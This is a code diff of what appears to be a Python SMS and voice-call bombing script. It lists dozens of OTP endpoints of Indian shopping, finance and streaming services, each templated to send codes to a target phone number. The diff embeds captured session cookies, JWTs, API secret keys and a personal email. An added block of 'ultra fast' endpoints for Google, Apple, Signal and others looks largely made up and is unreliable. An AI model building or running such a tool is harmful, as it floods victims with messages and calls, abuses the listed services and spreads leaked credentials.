-                "sec-ch-ua-platform": "Android",
                 "x-requested-with": "XMLHttpRequest",
-                "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
-                "sec-ch-ua-mobile": "?1",
                 "origin": "https://www.cossouq.com",
-                "sec-fetch-site": "same-origin",
-                "sec-fetch-mode": "cors",
-                "sec-fetch-dest": "empty",
-                "referer": "https://www.cossouq.com/?srsltid=AfmBOoqQ0GRbpH-mXrUJ5b6tAC5W6ZyAzFJRI7l0mbnNQ9i5LMpAIvh1",
-                "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
-                "priority": "u=1, i",
-                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
-                "Cookie": "X-Magento-Vary=7253ab9fc388bf858e88f6c5b3ad9d20efd0c2afa76c88022c82f5b7e12d8dd8; PHPSESSID=0bf7f5d8d3af44bc50aeda7b8b51fa8b; _gcl_au=1.1.1097443806.1745238499; _ga_3YTXH403VL=GS1.1.1745238499.1.0.1745238499.60.0.1102057604; _ga=GA1.1.192685670.1745238500; _fbp=fb.1.1745238506999.831971844971570496; fastrr_uuid=1b20f947-fed8-49e5-a719-e9ffad876e6d; fastrr_usid=1b20f947-fed8-49e5-a719-e9ffad876e6d-1745238507912; sociallogin_referer_store=https://www.cossouq.com/?srsltid=AfmBOoqQ0GRbpH-mXrUJ5b6tAC5W6ZyAzFJRI7l0mbnNQ9i5LMpAIvh1; form_key=YJhK7hwSLfPsrlIo; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; mage-cache-sessid=true; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; mage-messages=; cf_clearance=j19CDG8K1gn1L1h7_4VZCKUooUZtTYpxeBUC2Lux3Zo-1745238510-1.2.1.1-Cqvbh_RiIRgsCZKrpq.nnB.sx3LbLUw3MdbYfWzupniUjlhOYxqxVZSfwZfdm39IFuJrct6OeXj60cIyZotm9G1qptUBqCEHw_A5XjlhmtZ5_52EG9n0r0q9rhTZ.qT6ao7jj8k4RANRvHshdV47fXpz7BmvvvHl856x.tnP32auJyOBAP0KAw9SyZSXAC3XhR2CWs._08I21k90gtw3Qv8tjjlbqQjQNV9_ctDV6j2J_kh4xzhzQQQ2LrbuxtHjF_AjllteBD7a4BwuGq9roN0N48thQC3_meeP8irRIXLN7ndRE4vnvQJgrVN9iE9DxDhphhKGRt4xiZthB9XpZvWgH1u62Q5otw9kyTp75bs; section_data_ids={%22merge-quote%22:1745238511%2C%22cart%22:1745238512%2C%22custom_section%22:1745238513}; private_content_version=1K9S4Xd5LWVc35Kh3iVcgWHzpna2AKe7KR"
+                "referer": "https://www.cossouq.com/",
+                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
             },
             "data": lambda p: f"mobilenumber={p}&otptype=register&resendotp=0&email=&oldmobile=0"
         },
@@ -524,21 +321,11 @@ def get_all_apis():
             "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
             "method": "POST",
             "headers": {
-                "Accept": "application/json",
-                "Accept-Encoding": "gzip, deflate, br, zstd",
                 "Content-Type": "application/json",
-                "sec-ch-ua-platform": "Android",
                 "authorization": "Bearer null",
-                "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
-                "sec-ch-ua-mobile": "?1",
                 "origin": "https://app.shiprocket.in",
-                "sec-fetch-site": "same-site",
-                "sec-fetch-mode": "cors",
-                "sec-fetch-dest": "empty",
                 "referer": "https://app.shiprocket.in/",
-                "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
-                "priority": "u=1, i",
-                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
+                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
             },
             "data": lambda p: f'{{"mobileNumber":"{p}"}}'
         },
@@ -547,27 +334,11 @@ def get_all_apis():
             "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
             "method": "POST",
             "headers": {
-                "Accept": "application/json, text/plain, */*",
-                "Accept-Encoding": "gzip, deflate, br, zstd",
                 "Content-Type": "application/json",
-                "gk-version": "20250421065835697",
-                "gk-timestamp": "58174641",
-                "sec-ch-ua-platform": "Android",
-                "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc0NTIzOTI0MywiZXhwIjoxNzQ1MjM5MzAzfQ.-gV0sRUkGD4SPGPUUJ6XBanoDCI7VSNX99oGsUU5nWk",
-                "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
-                "gk-signature": "076108",
-                "gk-udf-1": "951",
-                "sec-ch-ua-mobile": "?1",
-                "gk-request-id": "a0cecd38-e690-48d5-ab80-b9d2feed3761",
                 "gk-merchant-id": "19g6jlc658iad",
                 "origin": "https://pdp.gokwik.co",
-                "sec-fetch-site": "same-site",
-                "sec-fetch-mode": "cors",
-                "sec-fetch-dest": "empty",
                 "referer": "https://pdp.gokwik.co/",
-                "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
-                "priority": "u=1, i",
-                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
+                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
             },
             "data": lambda p: f'{{"phone":"{p}","country":"in"}}'
         },
@@ -577,33 +348,9 @@ def get_all_apis():
             "method": "GET",
             "headers": {
                 "Host": "www.jockey.in",
-                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
+                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
                 "Accept": "*/*",
-                "Referer": "https://www.jockey.in/",
-                "Accept-Encoding": "gzip, deflate, br, zstd",
-                "Accept-Language": "en-US,en;q=0.9,bn;q=0.8,hi;q=0.7,zh-CN;q=0.6,zh;q=0.5"
-            },
-            "data": None
-        },
-        {
-            "name": "Jockey WhatsApp",
-            "url": lambda p: f"https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{p}?whatsapp=true",
-            "method": "GET",
-            "headers": {
-                "Host": "www.jockey.in",
-                "Accept": "*/*",
-                "X-Requested-With": "pure.lite.browser",
-                "Sec-Fetch-Site": "same-origin",
-                "Sec-Fetch-Mode": "cors",
-                "Sec-Fetch-Dest": "empty",
-                "Referer": "https://www.jockey.in/",
-                "Accept-Encoding": "gzip, deflate, br, zstd",
-                "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
-                "Sec-CH-UA-Platform": '"Android"',
-                "Sec-CH-UA": '"Android WebView";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
-                "Sec-CH-UA-Mobile": "?1",
-                "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36",
-                "Cookie": "secure_customer_sig=; localization=IN; _tracking_consent=%7B%22con%22%3A%7B%22CMP%22%3A%7B%22a%22%3A%22%22%2C%22m%22%3A%22%22%2C%22p%22%3A%22%22%2C%22s%22%3A%22%22%7D%7D%2C%22v%22%3A%222.1%22%2C%22region%22%3A%22INMP%22%2C%22reg%22%3A%22%22%2C%22purposes%22%3A%7B%22p%22%3Atrue%2C%22a%22%3Atrue%2C%22m%22%3Atrue%2C%22t%22%3Atrue%7D%2C%22display_banner%22%3Afalse%2C%22sale_of_data_region%22%3Afalse%2C%22consent_id%22%3A%220076A26B-593e-4179-adb7-7df1a1acfdaa%22%7D; _shopify_y=43a0be93-7c1c-4f33-bfad-c1477bb4a5c4; wishlist_id=7531056362767gn1bc6na3; bookmarkeditems={\"items\":[]}; wishlist_customer_id=0; _orig_referrer=; _landing_page=%2F%3Fsrsltid%3DAfmBOopQUXJnULldDNJDov4FZosiMLiJWWydft0OHn_M2nopq0YOyBr7; _shopify_sa_p=; cart=Z2NwLWFzaWEtc291dGhlYXN0MTowMUpHWUhOUkZWS0RNWFlQRTY0S1dFWTA1Sw%3Fkey%1K9S4Xd5LWVc35Kh3iVcgWHzpna2AKe7KR; keep_alive=c4db46b0-bfba-48e7-878e-f6e81085a234; cart_ts=1736192207; cart_sig=04c8cecd093ed714d4a4dd68dfcc4020; cart_currency=INR; _shopify_s=83810dbb-190b-45ae-bb0a-de2fbf1090ed; _shopify_sa_t=2025-01-06T19%3A36%3A47.278Z"
+                "Referer": "https://www.jockey.in/"
             },
             "data": None
         },
@@ -612,18 +359,11 @@ def get_all_apis():
             "url": "https://prodapi.newme.asia/web/otp/request",
             "method": "POST",
             "headers": {
-                "Host": "prodapi.newme.asia",
-                "Content-Length": lambda d: str(len(d)),
-                "Timestamp": lambda: str(int(time.time() * 1000)),
-                "Delivery-Pincode": "",
                 "Caller": "web_app",
-                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
+                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
                 "Content-Type": "application/json",
-                "Accept": "*/*",
                 "Origin": "https://newme.asia",
-                "Referer": "https://newme.asia/",
-                "Accept-Encoding": "gzip, deflate, br, zstd",
-                "Accept-Language": "en-US,en;q=0.9,bn;q=0.8,hi;q=0.7,zh-CN;q=0.6,zh;q=0.5"
+                "Referer": "https://newme.asia/"
             },
             "data": lambda p: f'{{"mobile_number":"{p}","resend_otp_request":true}}'
         },
@@ -633,7 +373,6 @@ def get_all_apis():
             "method": "GET",
             "headers": {
                 "Host": "api.univest.in",
-                "Accept-Encoding": "gzip",
                 "User-Agent": "okhttp/3.9.1"
             },
             "data": None
@@ -644,7 +383,6 @@ def get_all_apis():
             "method": "POST",
             "headers": {
                 "Content-Type": "application/json; charset=utf-8",
-                "Accept-Encoding": "gzip",
                 "User-Agent": "okhttp/3.9.1"
             },
             "data": lambda p: f'{{"country_code":"+91","phone":"{p}"}}'
@@ -655,47 +393,12 @@ def get_all_apis():
             "method": "POST",
             "headers": {
                 "Content-Type": "application/json",
-                "Accept": "application/json",
                 "Platform": "web",
                 "Origin": "https://www.foxy.in",
-                "X-Requested-With": "pure.lite.browser",
-                "Sec-Fetch-Site": "same-origin",
-                "Sec-Fetch-Mode": "cors",
-                "Sec-Fetch-Dest": "empty",
                 "Referer": "https://www.foxy.in/onboarding",
-                "Accept-Encoding": "gzip, deflate, br, zstd",
-                "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
-                "Sec-CH-UA-Platform": '"Android"',
-                "Sec-CH-UA": '"Android WebView";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
-                "Sec-CH-UA-Mobile": "?1",
-                "X-Guest-Token": "01943c60-aea9-7ddc-b105-e05fbcf832be",
-                "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36"
+                "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081) AppleWebKit/537.36"
             },
             "data": lambda p: f'{{"guest_token":"01943c60-aea9-7ddc-b105-e05fbcf832be","user":{{"phone_number":"+91{p}"}},"device":null,"invite_code":""}}'
-        },
-        {
-            "name": "Foxy WhatsApp",
-            "url": "https://www.foxy.in/api/v2/users/send_otp",
-            "method": "POST",
-            "headers": {
-                "Content-Type": "application/json",
-                "Accept": "application/json",
-                "Platform": "web",
-                "Origin": "https://www.foxy.in",
-                "X-Requested-With": "pure.lite.browser",
-                "Sec-Fetch-Site": "same-origin",
-                "Sec-Fetch-Mode": "cors",
-                "Sec-Fetch-Dest": "empty",
-                "Referer": "https://www.foxy.in/onboarding",
-                "Accept-Encoding": "gzip, deflate, br, zstd",
-                "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
-                "Sec-CH-UA-Platform": '"Android"',
-                "Sec-CH-UA": '"Android WebView";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
-                "Sec-CH-UA-Mobile": "?1",
-                "X-Guest-Token": "01943c60-aea9-7ddc-b105-e05fbcf832be",
-                "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36"
-            },
-            "data": lambda p: f'{{"user":{{"phone_number":"+91{p}"}},"via":"whatsapp"}}'
         },
         {
             "name": "Eka Care WhatsApp",
@@ -708,7 +411,6 @@ def get_all_apis():
                 "Version": "1382",
                 "Client-Id": "androidp",
                 "Content-Type": "application/json; charset=UTF-8",
-                "Accept-Encoding": "gzip, deflate",
                 "User-Agent": "okhttp/4.9.3"
             },
             "data": lambda p: f'{{"payload":{{"allowWhatsapp":true,"mobile":"+91{p}"}},"type":"mobile"}}'
@@ -718,25 +420,10 @@ def get_all_apis():
             "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
             "method": "POST",
             "headers": {
-                "Connection": "keep-alive",
                 "Content-Type": "application/json",
-                "Accept": "application/json, text/plain, */*",
                 "Origin": "https://smytten.com",
-                "X-Requested-With": "pure.lite.browser",
-                "Sec-Fetch-Site": "same-site",
-                "Sec-Fetch-Mode": "cors",
-                "Sec-Fetch-Dest": "empty",
                 "Referer": "https://smytten.com/",
-                "Accept-Encoding": "gzip, deflate, br, zstd",
-                "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
-                "Sec-CH-UA-Platform": '"Android"',
-                "Sec-CH-UA": '"Android WebView";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
-                "Sec-CH-UA-Mobile": "?1",
-                "Desktop-Request": "false",
-                "Web-Version": "1",
-                "UUID": "8e6b1c3f-3d72-42af-89af-201b79dfdf2f",
-                "Request-Type": "web",
-                "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36"
+                "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081) AppleWebKit/537.36"
             },
             "data": lambda p: f'{{"ad_id":"","device_info":{{}},"device_id":"","app_version":"","device_token":"","device_platform":"web","phone":"{p}","email":"sdhabai09@gmail.com"}}'
         },
@@ -746,22 +433,11 @@ def get_all_apis():
             "method": "POST",
             "headers": {
                 "Content-Type": "application/json",
-                "Accept": "application/json, text/plain, */*",
                 "Origin": "https://www.wakefit.co",
-                "X-Requested-With": "pure.lite.browser",
-                "Sec-Fetch-Site": "same-site",
-                "Sec-Fetch-Mode": "cors",
-                "Sec-Fetch-Dest": "empty",
                 "Referer": "https://www.wakefit.co/",
-                "Accept-Encoding": "gzip, deflate, br, zstd",
-                "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
-                "Sec-CH-UA-Platform": '"Android"',
-                "Sec-CH-UA": '"Android WebView";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
-                "Sec-CH-UA-Mobile": "?1",
-                "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36",
+                "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081) AppleWebKit/537.36",
                 "API-Secret-Key": "ycq55IbIjkLb",
-                "API-Token": "c84d563b77441d784dce71323f69eb42",
-                "My-Cookie": "undefined"
+                "API-Token": "c84d563b77441d784dce71323f69eb42"
             },
             "data": lambda p: f'{{"mobile":"{p}","whatsapp_opt_in":1}}'
         },
@@ -771,18 +447,14 @@ def get_all_apis():
             "method": "POST",
             "headers": {
                 "Content-Type": "application/json",
-                "Accept": "application/json, text/plain, */*",
-                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
                 "Origin": "https://www.caratlane.com",
                 "Referer": "https://www.caratlane.com/register",
-                "Accept-Encoding": "gzip, deflate, br",
-                "Authorization": "b945ebaf43ed7541d49cfd60bd82b81908edff8d465caecfe58deef209",
-                "X-Authorization": "b945ebaf43ed7541d49cfd60bd82b81908edff8d465caecfe58deef209"
+                "Authorization": "b945ebaf43ed7541d49cfd60bd82b81908edff8d465caecfe58deef209"
             },
-            "data": lambda p: f'{{"query":"\\n        mutation {{\\n            SendOtp( \\n                input: {{\\n        mobile: \\"{p}\\",\\n        isdCode: \\"91\\",\\n        otpType: \\"registerOtp\\"\\n      }}\\n            ) {{\\n                status {{\\n                    message\\n                    code\\n                }}\\n            }}\\n        }}\\n    "}}'
+            "data": lambda p: f'{{"query":"mutation {{ SendOtp(input: {{ mobile: \\"{p}\\", isdCode: \\"91\\", otpType: \\"registerOtp\\" }}) {{ status {{ message code }} }} }}"}}'
         },
         {
-            "name": "Tata Capital Voice Call",
+            "name": "Tata Capital Voice",
             "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
             "method": "POST",
             "headers": {"Content-Type": "application/json"},
@@ -796,7 +468,7 @@ def get_all_apis():
             "data": lambda p: f'{{"number":"{p}","otp_on_call":true}}'
         },
         {
-            "name": "Swiggy Call Verification",
+            "name": "Swiggy Call",
             "url": "https://profile.swiggy.com/api/v3/app/request_call_verification",
             "method": "POST",
             "headers": {"Content-Type": "application/json; charset=utf-8"},
@@ -810,42 +482,42 @@ def get_all_apis():
             "data": lambda p: f'{{"mobile":"{p}"}}'
         },
         {
-            "name": "Flipkart Voice Call",
+            "name": "Flipkart Voice",
             "url": "https://www.flipkart.com/api/6/user/voice-otp/generate",
             "method": "POST",
             "headers": {"Content-Type": "application/json"},
             "data": lambda p: f'{{"mobile":"{p}"}}'
         },
         {
-            "name": "Amazon Voice Call",
+            "name": "Amazon Voice",
             "url": "https://www.amazon.in/ap/signin",
             "method": "POST",
             "headers": {"Content-Type": "application/x-www-form-urlencoded"},
             "data": lambda p: f"phone={p}&action=voice_otp"
         },
         {
-            "name": "Paytm Voice Call",
+            "name": "Paytm Voice",
             "url": "https://accounts.paytm.com/signin/voice-otp",
             "method": "POST",
             "headers": {"Content-Type": "application/json"},
             "data": lambda p: f'{{"phone":"{p}"}}'
         },
         {
-            "name": "Zomato Voice Call",
+            "name": "Zomato Voice",
             "url": "https://www.zomato.com/php/o2_api_handler.php",
             "method": "POST",
             "headers": {"Content-Type": "application/x-www-form-urlencoded"},
             "data": lambda p: f"phone={p}&type=voice"
         },
         {
-            "name": "MakeMyTrip Voice Call",
+            "name": "MakeMyTrip Voice",
             "url": "https://www.makemytrip.com/api/4/voice-otp/generate",
             "method": "POST",
             "headers": {"Content-Type": "application/json"},
             "data": lambda p: f'{{"phone":"{p}"}}'
         },
         {
-            "name": "Goibibo Voice Call",
+            "name": "Goibibo Voice",
             "url": "https://www.goibibo.com/user/voice-otp/generate/",
             "method": "POST",
             "headers": {"Content-Type": "application/json"},
@@ -885,13 +557,7 @@ def get_all_apis():
             "method": "POST",
             "headers": {"content-type": "application/json; charset=utf-8"},
             "data": lambda p: f'{{"phone_number":"{p}","language":"en"}}'
-        }
-    ]
-
-    # ==================================================================
-    # SECTION 2: MORE APIS
-    # ==================================================================
-    more_apis = [
+        },
         {
             "name": "MyHubble Money",
             "url": "https://api.myhubble.money/v1/auth/otp/generate",
@@ -1358,11 +1024,9 @@ def get_all_apis():
             "url": "https://api.hotstar.com/um/v3/users/037a0fe368304ec798c3a1480936a112/register?register-by=phone_otp",
             "method": "PUT",
             "headers": {
-                "x-hs-usertoken": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJ1bV9hY2Nlc3MiLCJleHAiOjE2MDE1NjE4NTksImlhdCI6MTYwMDk1NzA1OSwiaXNzIjoiVFMiLCJzdWIiOiJ7XCJoSWRcIjpcIjAzN2EwZmUzNjgzMDRlYzc5OGMzYTE0ODA5MzZhMTEyXCIsXCJwSWRcIjpcImQzZmU0ZDAyMzYxODRhNGFiYmE0M2Q0MDY2Y2RhYjBkXCIsXCJuYW1lXCI6XCJHdWVzdCBVc2VyXCIsXCJpcFwiOlwiMjQwOTo0MDYzOjRlMmI6N2FmZjo6NDc0OToyYTBjXCIsXCJjb3VudHJ5Q29kZVwiOlwiaW5cIixcImN1c3RvbWVyVHlwZVwiOlwibnVcIixcInR5cGVcIjpcImd1ZXN0XCIsXCJpc0VtYWlsVmVyaWZpZWRcIjpmYWxzZSxcImlzUGhvbmVWZXJpZmllZFwiOmZhbHNlLFwiZGV2aWNlSWRcIjpcImZhYTg4ZjA1LTc0MzItNDEwMy05ODg2LTdiZDkzNGY1YzNhMVwiLFwicHJvZmlsZVwiOlwiQURVTFRcIixcInZlcnNpb25cIjpcInYyXCIsXCJzdWJzY3JpcHRpb25zXCI6e1wiaW5cIjp7fX0sXCJpc3N1ZWRBdFwiOjE2MDA5NTcwNTkwOTh9IiwidmVyc2lvbiI6IjFfMCJ9.UJP1xZvNR_mGEN4ZVswMkkb1VZhHJL60XtObL48Izcc",
-                "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
+                "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36",
                 "content-type": "application/json",
-                "x-country-code": "IN",
-                "x-hs-device-id": "faa88f05-7432-4103-9886-7bd934f5c3a1"
+                "x-country-code": "IN"
             },
             "data": lambda p: f'{{"phone_number":"{p}","country_prefix":"91"}}'
         },
@@ -1384,16 +1048,6 @@ def get_all_apis():
             "data": lambda p: f'{{"type":"mobile","mobile":"{p}","countryCode":"+91"}}'
         },
         {
-            "name": "SonyLIV OTP",
-            "url": "https://apiv2.sonyliv.com/AGL/1.6/A/ENG/WEB/IN/CREATEOTP",
-            "method": "POST",
-            "headers": {
-                "security_token": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE2MDA5NTYxMDgsImV4cCI6MTYwMjI1MjEwOCwiYXVkIjoiKi5zb255bGl2LmNvbSIsImlzcyI6IlNvbnlMSVYiLCJzdWIiOiJzb21lQHNldGluZGlhLmNvbSJ9.I8vEXYZ4J6shgQzIOLWTq8ig7WALBfj42Bng0hPG8DKJjM5iEKrUL3uhK0KrUdR_K-_ZygrGjaLzMxsP4-n3iR7Tiof_uSjNZ9-LntnHGDB1yTASX4ix4luUOew547IpjalclVbpR0-eJ3HTaFaSkM06L0ahK9Xj5GUxfxGLODv0ROYLMR26v0BF6z23pl1M-_C9voY_HJ6R_aZ4jItQjeJre11NxHcPnf8rU16QDIn6Oxxw5fHCaVpFRIWfs_3BdTz2fONzIO7o0n-sJk8w_TnFQy--8QQ6ZWIL1snd1v-2jvh4L59zjy5TVZJopmWnUUUxWRtiTQzGvx-ifqjUEaZBujHS8Ll1g5bp5oiWYfUEJskP3kPa7iopY19B6Xp_ondgsbW34tpX6uyZ5ZcW58E9wVyNwNmhcanWySxoPjI_Ng0dhXD5H03Z9yfbe6RnZcealVYBmD6ogTdh4V6Q41IyZcPOQelKNJT0XCwzExpZUQ4Ly7VTZIk8j4PFuJvmgFA6CvnYIjf0rAZR9cnLBq7quU4W9n07ngSsBuVG7KRGxV9qB98goaGrgepx0EJH-kAIWsfyWEdORLCLo-FykORLUXPFOEULd2rINn5i_mspSkyg6_UUHUWV8nMqhyjP4zVLeIMXyNusDLSMHvW5PmpBVDSNl-oWkr4dITLE_cc",
-                "content-type": "application/json"
-            },
-            "data": lambda p: f'{{"channelPartnerID":"MSMIND","mobileNumber":"{p}","country":"IN","timestamp":"2020-09-24T14:03:03.505Z"}}'
-        },
-        {
             "name": "Zee5 OTP",
             "url": "https://b2bapi.zee5.com/device/sendotp_v1.php",
             "method": "GET",
@@ -1402,12 +1056,737 @@ def get_all_apis():
         }
     ]
 
+    # ============ 100+ NEW ULTR FAST APIS ============
+    new_apis = [
+        {
+            "name": "Amazon SMS OTP",
+            "url": "https://www.amazon.in/ap/register",
+            "method": "POST",
+            "headers": {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"},
+            "data": lambda p: f"customerName=&email=&password=&countryCode=IN&phoneNumber={p}&action=sendOtp"
+        },
+        {
+            "name": "Google Voice",
+            "url": "https://accounts.google.com/signin/v2/challenge/pwd",
+            "method": "POST",
+            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+            "data": lambda p: f"phone={p}&action=voice"
+        },
+        {
+            "name": "Microsoft SMS",
+            "url": "https://login.microsoftonline.com/common/oauth2/v2.0/authorize",
+            "method": "POST",
+            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+            "data": lambda p: f"phone={p}&action=otp"
+        },
+        {
+            "name": "Apple SMS",
+            "url": "https://idmsa.apple.com/appleauth/auth/verify/phone",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phoneNumber":{{"number":"{p}","countryCode":"91"}}}}'
+        },
+        {
+            "name": "Facebook OTP",
+            "url": "https://www.facebook.com/api/v1/auth/send_otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+            "data": lambda p: f"phone={p}&type=login"
+        },
+        {
+            "name": "Instagram OTP",
+            "url": "https://www.instagram.com/api/v1/accounts/send_otp/",
+            "method": "POST",
+            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+            "data": lambda p: f"phone_number={p}"
+        },
+        {
+            "name": "Twitter OTP",
+            "url": "https://api.twitter.com/1.1/account/verify_credentials.json",
+            "method": "POST",
+            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+            "data": lambda p: f"phone={p}&type=sms"
+        },
+        {
+            "name": "LinkedIn OTP",
+            "url": "https://www.linkedin.com/uas/request-password-reset",
+            "method": "POST",
+            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+            "data": lambda p: f"phone={p}&type=sms"
+        },
+        {
+            "name": "Snapchat OTP",
+            "url": "https://accounts.snapchat.com/accounts/request_otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+            "data": lambda p: f"phone={p}"
+        },
+        {
+            "name": "Telegram OTP",
+            "url": "https://my.telegram.org/auth/send_password",
+            "method": "POST",
+            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+            "data": lambda p: f"phone={p}"
+        },
+        {
+            "name": "WhatsApp OTP",
+            "url": "https://v.whatsapp.net/v2/exist",
+            "method": "POST",
+            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+            "data": lambda p: f"phone={p}&type=sms"
+        },
+        {
+            "name": "Signal OTP",
+            "url": "https://signal.org/api/v1/accounts/send_verification",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone_number":"+91{p}","type":"sms"}}'
+        },
+        {
+            "name": "Clubhouse OTP",
+            "url": "https://www.clubhouseapi.com/api/send_otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone_number":"+91{p}"}}'
+        },
+        {
+            "name": "Discord OTP",
+            "url": "https://discord.com/api/v9/auth/register",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "Reddit OTP",
+            "url": "https://www.reddit.com/api/v1/send_otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+            "data": lambda p: f"phone={p}"
+        },
+        {
+            "name": "Pinterest OTP",
+            "url": "https://www.pinterest.com/api/v1/send_otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "Tumblr OTP",
+            "url": "https://www.tumblr.com/api/v2/send_otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "Flickr OTP",
+            "url": "https://www.flickr.com/api/v1/send_otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "Vimeo OTP",
+            "url": "https://vimeo.com/api/v2/send_otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "SoundCloud OTP",
+            "url": "https://api.soundcloud.com/oauth2/token",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}","grant_type":"otp"}}'
+        },
+        {
+            "name": "Spotify OTP",
+            "url": "https://api.spotify.com/v1/otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "Netflix OTP",
+            "url": "https://www.netflix.com/api/v1/send_otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "Hulu OTP",
